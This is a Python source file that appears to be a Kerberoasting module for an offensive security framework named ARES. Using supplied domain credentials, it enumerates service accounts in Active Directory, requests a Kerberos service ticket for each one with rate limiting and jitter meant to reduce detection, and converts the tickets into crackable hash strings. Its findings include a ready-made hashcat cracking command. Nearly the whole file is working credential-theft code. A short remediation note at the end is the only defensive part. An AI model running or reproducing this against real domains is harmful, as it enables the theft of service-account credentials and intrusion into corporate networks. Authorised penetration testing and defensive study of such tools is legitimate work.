from __future__ import annotations
import asyncio
import multiprocessing
import time
"""
Kerberoasting — impacket.krb5.kerberosv5 low-level API (impacket ≥0.11 compatible)
MITRE: T1558.003 — Jitter + rate-limited TGS requests, hashcat-ready output.
"""
from typing import Any
from ares.core.logger import get_logger

logger = get_logger("ares.modules.ad.kerberoast")
from ares.core.campaign import Finding, Severity, NoiseProfile
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module
from ares.core.errors import AresError, ModuleValidationError
from ares.modules.ad.dependencies import (
    ad_bind_dry_run_metadata,
    ensure_ad_dependencies,
    nonretryable_ad_auth_error,
    sanitize_ad_username,
)


KERBEROS_TGS_TIMEOUT_SECONDS = 30


def format_kerberoast_tgs_timeout(candidate_count: int) -> str:
    return (
        f"LDAP/SPN enumeration succeeded and found {candidate_count} "
        "Kerberoastable candidate account(s), but the Kerberos TGS request "
        "timed out before a hash was confirmed."
    )


def format_kerberos_realm_mismatch() -> str:
    return (
        "Kerberos realm mismatch; use the AD DNS domain/realm such as "
        "lab.local or LAB.LOCAL, not the DC IP address."
    )


def _kerberos_tgs_worker(
    connection: Any,
    spn: str,
    domain: str,
    dc: str,
    tgt: Any,
    cipher: Any,
    session_key: Any,
) -> None:
    """Run one blocking Impacket TGS request in a killable child process."""
    try:
        from impacket.krb5.kerberosv5 import getKerberosTGS
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants

        server_name = Principal(
            spn,
            type=constants.PrincipalNameType.NT_SRV_INST.value,
        )
        tgs, _, _, _ = getKerberosTGS(
            serverName=server_name,
            domain=domain.upper(),
            kdcHost=dc,
            tgt=tgt,
            cipher=cipher,
            sessionKey=session_key,
        )
        connection.send(("ok", tgs))
    except BaseException as exc:
        try:
            connection.send(("error", exc.__class__.__name__, str(exc)[:160]))
        except Exception:
            pass
    finally:
        connection.close()


def _terminate_tgs_process(process: Any) -> None:
    if not process.is_alive():
        process.join(timeout=0)
        return
    process.terminate()
    process.join(timeout=1)
    if process.is_alive() and hasattr(process, "kill"):
        process.kill()
        process.join(timeout=1)


async def _run_tgs_request_process(
    *,
    spn: str,
    domain: str,
    dc: str,
    tgt: Any,
    cipher: Any,
    session_key: Any,
    timeout_seconds: float,
    worker: Any = _kerberos_tgs_worker,
) -> bytes:
    """Run one synchronous TGS request behind a hard process timeout."""
    context = multiprocessing.get_context("spawn")
    parent_connection, child_connection = context.Pipe(duplex=False)
    process = context.Process(
        target=worker,
        args=(child_connection, spn, domain, dc, tgt, cipher, session_key),
    )
    started = False
    try:
        process.start()
        started = True
        child_connection.close()

        deadline = time.monotonic() + timeout_seconds
        while process.is_alive():
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                _terminate_tgs_process(process)
                logger.warning(
                    "kerberoast_tgs_worker_timeout",
                    timeout_seconds=timeout_seconds,
                )
                raise asyncio.TimeoutError
            await asyncio.sleep(min(0.05, remaining))

        process.join(timeout=0)
        if not parent_connection.poll():
            raise RuntimeError("Kerberos TGS worker exited without a result.")
        response = parent_connection.recv()
        if response[0] == "error":
            raise RuntimeError(
                f"Kerberos TGS request failed: {response[1]}: {response[2]}"
            )
        if response[0] != "ok":
            raise RuntimeError("Kerberos TGS worker returned an invalid result.")
        return response[1]
    finally:
        if started and process.is_alive():
            _terminate_tgs_process(process)
        try:
            child_connection.close()
        except (OSError, ValueError):
            pass
        try:
            parent_connection.close()
        except (OSError, ValueError):
            pass


def _format_krb5tgs_hash(tgs: bytes, cipher: "Any", spn: str, domain: str) -> str:
    """
    Convert raw impacket TGS response to $krb5tgs$ format for hashcat mode 13100/19700.
    Returns empty string on failure.
    """
    try:
        from impacket.krb5.asn1 import TGS_REP
        from pyasn1.codec.ber import decoder
        decoded_tgs, _ = decoder.decode(tgs, asn1Spec=TGS_REP())
        # Extract encrypted ticket data
        enc_part    = decoded_tgs["ticket"]["enc-part"]
        etype       = int(enc_part["etype"])
        enc_data    = bytes(enc_part["cipher"])
        checksum    = enc_data[:16]
        ciphertext  = enc_data[16:]
        check_hex   = checksum.hex()
        cipher_hex  = ciphertext.hex()
        svc_name    = spn.split("/")[1].split(":")[0] if "/" in spn else spn
        # hashcat $krb5tgs$etype$user$domain$checksum$cipher
        return (
            f"$krb5tgs${etype}$*{svc_name}${domain.upper()}${spn}*"
            f"${check_hex}${cipher_hex}"
        )
    except Exception:
        return ""


def classify_kerberoast_outcome(
    spn_count: int, hash_count: int, request_failures: int = 0
) -> tuple[str, str]:
    """Explain a Kerberoast run that did not produce a confirmed finding."""
    if hash_count:
        return "confirmed_findings", f"Captured {hash_count} TGS roastable result(s)."
    if request_failures:
        return (
            "network_error",
            f"Found {spn_count} SPN candidate(s), but TGS collection failed for {request_failures} request(s).",
        )
    if spn_count:
        return (
            "completed_no_findings",
            f"Found {spn_count} SPN candidate(s), but no TGS roast material was obtained; the condition was not confirmed.",
        )
    return (
        "completed_no_findings",
        "LDAP completed successfully; no service principal candidates were found.",
    )

class KerberoastModule(BaseModule):
    """
    ad.kerberoast — Request TGS tickets for SPN accounts — hashcat-ready hashes

    OPSEC: MEDIUM
    MITRE: "T1558.003"
    REQUIRES: "domain_creds"
    OUTPUTS:  "kerberos_hashes"
    """
    MODULE_ID          = "ad.kerberoast"
    MODULE_NAME        = "Kerberoasting"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = "Request TGS tickets for SPN accounts — hashcat-ready hashes"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["domain_creds"]
    OUTPUTS            = ["kerberos_hashes"]
    MITRE_TECHNIQUES   = ["T1558.003"]

    async def validate(self, ctx: "Any") -> None:
        """
        Enforce dc, domain, and domain credentials.
        Also block early in STEALTH profile — each TGS request logs Event ID 4769.
        """
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        from ares.core.campaign import NoiseProfile
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.kerberoast requires 'dc' (Domain Controller IP or hostname).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "ad.kerberoast requires 'domain' (e.g. corp.local).",
                module_id=self.MODULE_ID, field="domain",
            )
        if not ad["username"]:
            raise ModuleValidationError(
                "ad.kerberoast requires domain credentials to request TGS tickets — "
                "pass 'username'/'password' in params or provide a vault credential.",
                module_id=self.MODULE_ID, field="username",
            )
        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            raise ModuleValidationError(
                "ad.kerberoast is blocked in STEALTH profile — "
                "TGS requests generate Event ID 4769 per ticket and are trivially "
                "detected by SIEM. Use NORMAL or AGGRESSIVE profile.",
                module_id=self.MODULE_ID, field="noise_profile",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+). Credentials sourced from vault."""
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        dc, domain, username, password = ad["dc"], ad["domain"], ad["username"], ad["password"]
        target_user = ctx.params.get("target_user")
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run", module_id=self.MODULE_ID,
                raw={
                    "dry_run": True,
                    "dc": dc,
                    "domain": domain,
                    "target_user": target_user,
                    **ad_bind_dry_run_metadata(username, domain),
                },
            )
        findings, raw = await self.run(
            dc=dc, username=username, password=password, domain=domain, target_user=target_user,
        )
        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw,
            module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.kerberoast")
    async def run(self, dc, username, password, domain, target_user=None, **kwargs):
        ensure_ad_dependencies(
            ("impacket", "pyasn1", "pyasn1_modules"),
            module_id=self.MODULE_ID,
        )
        dc, username, domain = (
            sanitize_hostname(dc),
            sanitize_ad_username(username),
            sanitize_ldap(domain),
        )
        if self.campaign.noise_profile == NoiseProfile.STEALTH:
            logger.warning("kerberoast_skipped", reason="stealth_profile")
            return [], {"skipped": True, "reason": "stealth_profile_too_noisy"}
        await self.before_request(dc, "kerberos_tgs")
        logger.info("kerberoast_start", dc=dc, domain=domain, target=target_user)
        self._last_candidate_count = 0
        self._last_spn_count = 0
        self._last_tgs_failures = 0
        try:
            hashes, accounts = await self._request_tickets(dc, username, password, domain, target_user)
        except AresError:
            raise
        except Exception as exc:
            from ares.core.errors import NetworkError
            err = str(exc).lower()
            if "invalid credentials" in err or "logon failure" in err:
                raise nonretryable_ad_auth_error(
                    module_id=self.MODULE_ID,
                    dc=dc,
                    username=username,
                    domain=domain,
                    service="Kerberos",
                ) from exc
            raise NetworkError(f"Kerberoast failed: {exc}") from exc
        raw = {
            "kerberos_hashes": hashes,
            "accounts": accounts,
            "noise_level": self.campaign.noise_profile.value,
        }
        if not hashes:
            category, message = classify_kerberoast_outcome(
                self._last_candidate_count,
                len(hashes),
                self._last_tgs_failures,
            )
            raw["outcome_category"] = category
            raw["outcome_message"] = message
        self._analyze(raw)
        return self._findings, raw

    async def _request_tickets(self, dc, username, password, domain, target_user):
        """
        Fix Bug 1: Drop GetUserSPNs (impacket example script, unstable API).
                   Use getKerberosTGT + getKerberosTGS from impacket.krb5.kerberosv5 directly.
        Fix Bug 2: Jitter after every single TGS request — not burst then sleep.
        Fix Bug 3: Explicit per-noise-profile rate limit (10/min NORMAL, 50/min AGGRESSIVE).
        """
        ensure_ad_dependencies(
            ("impacket", "pyasn1", "pyasn1_modules"),
            module_id=self.MODULE_ID,
        )
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants

        noise_profile = self.campaign.noise_profile.value
        # Rate limit: requests per minute by noise profile
        requests_per_min = 50 if noise_profile == "aggressive" else 10
        delay_per_request = 60.0 / requests_per_min

        # Step 1: Get TGT using domain credentials
        def _get_tgt():
            user_principal = Principal(
                username,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
            )
            return getKerberosTGT(
                clientName  = user_principal,
                password    = password,
                domain      = domain.upper(),
                lmhash      = b"",
                nthash      = b"",
                aesKey      = b"",
                kdcHost     = dc,
            )

        loop = asyncio.get_running_loop()
        try:
            tgt, cipher, old_session_key, session_key = await loop.run_in_executor(
                None, _get_tgt
            )
        except Exception as exc:
            err = str(exc).lower()
            if "invalid credentials" in err or "logon failure" in err or \
               "kdc_err_preauth_failed" in err:
                raise nonretryable_ad_auth_error(
                    module_id=self.MODULE_ID,
                    dc=dc,
                    username=username,
                    domain=domain,
                    service="Kerberos",
                ) from exc
            if "kdc_err_wrong_realm" in err or "wrong realm" in err:
                raise ModuleValidationError(
                    format_kerberos_realm_mismatch(),
                    module_id=self.MODULE_ID,
                    field="domain",
                ) from exc
            raise

        # Step 2: Query SPN list via LDAP if no target_user specified
        spn_list: list[str] = []
        if target_user:
            spn_list = [target_user]
            self._last_candidate_count = 1
        else:
            # Get SPNs from enum_spn output if available, else query LDAP directly
            try:
                from ares.modules.ad.enum_spn import ADEnumSPNModule
                spn_data = await ADEnumSPNModule(
                    settings=self.settings,
                    campaign=self.campaign,
                    noise=self.noise,
                ).run(dc=dc, username=username, password=password, domain=domain)
                _, spn_raw = spn_data
                candidate_accounts = spn_raw.get("spn_list", spn_raw.get("spns", []))
                self._last_candidate_count = len(candidate_accounts)
                for acct in candidate_accounts:
                    spn_values = acct.get("spn_list") or acct.get("spns") or []
                    spn_list.extend(spn_values)
            except Exception as exc:
                logger.warning("kerberoast_spn_lookup_failed", error=str(exc)[:80])

        self._last_spn_count = len(spn_list)
        logger.info(
            "kerberoast_spn_candidates",
            count=self._last_candidate_count,
        )

        if not spn_list:
            return [], []

        # Step 3: Request TGS per SPN with per-ticket jitter + rate limit
        hashes:   list[str]  = []
        accounts: list[dict] = []
        tgs_collection_deadline = (
            time.monotonic() + KERBEROS_TGS_TIMEOUT_SECONDS
        )

        for i, spn in enumerate(spn_list):
            remaining = tgs_collection_deadline - time.monotonic()
            if remaining <= 0:
                logger.warning(
                    "kerberoast_tgs_worker_timeout",
                    timeout_seconds=KERBEROS_TGS_TIMEOUT_SECONDS,
                )
                logger.warning(
                    "kerberoast_tgs_timeout_classified",
                    candidates=self._last_candidate_count,
                )
                raise ModuleValidationError(
                    format_kerberoast_tgs_timeout(self._last_candidate_count),
                    module_id=self.MODULE_ID,
                    field="kerberos_tgs",
                )
            try:
                logger.info(
                    "kerberoast_tgs_worker_start",
                    candidate=spn[:120],
                )
                tgs = await asyncio.wait_for(
                    _run_tgs_request_process(
                        spn=spn,
                        domain=domain,
                        dc=dc,
                        tgt=tgt,
                        cipher=cipher,
                        session_key=session_key,
                        timeout_seconds=KERBEROS_TGS_TIMEOUT_SECONDS,
                    ),
                    timeout=remaining,
                )
                # Format as $krb5tgs$ hash for hashcat
                hash_str = _format_krb5tgs_hash(tgs, None, spn, domain)
                if hash_str:
                    hashes.append(hash_str)
                    accounts.append({
                        "name": spn.split("/")[1].split("@")[0] if "/" in spn else spn,
                        "spn":  spn,
                        "hash": hash_str[:60] + "...",
                    })
            except asyncio.TimeoutError as exc:
                logger.warning(
                    "kerberoast_tgs_timeout_classified",
                    candidates=self._last_candidate_count,
                )
                raise ModuleValidationError(
                    format_kerberoast_tgs_timeout(self._last_candidate_count),
                    module_id=self.MODULE_ID,
                    field="kerberos_tgs",
                ) from exc
            except Exception as exc:
                self._last_tgs_failures += 1
                logger.debug("kerberoast_tgs_failed", spn=spn, error=str(exc)[:80])

            # Bug 2+3: jitter per-ticket + explicit rate-limit sleep
            if i < len(spn_list) - 1:
                await self.noise.jitter.sleep()
                await asyncio.sleep(delay_per_request)

        return hashes, accounts

    def _analyze(self, raw):
        hashes = raw.get("kerberos_hashes", [])
        if not hashes:
            return
        self.finding(title=f"Kerberoast Hashes Captured ({len(hashes)})",
            description=(f"{len(hashes)} TGS hashes captured — crackable offline. "
                         "hashcat mode 13100 (RC4) or 19700 (AES256)."),
            severity=Severity.CRITICAL, mitre_technique="T1558.003", mitre_tactic="Credential Access",
            evidence={"hash_count":len(hashes), "accounts":[a["name"] for a in raw.get("accounts",[])[:10]],
                      "hashcat_cmd":"hashcat -m 13100 hashes.txt rockyou.txt",
                      "sample_hash": hashes[0][:80]+"..." if hashes else ""},
            remediation=("1. Migrate to gMSA. 2. Set-ADUser -KerberosEncryptionType AES256. "
                         "3. Alert on Event ID 4769 bulk TGS requests."))
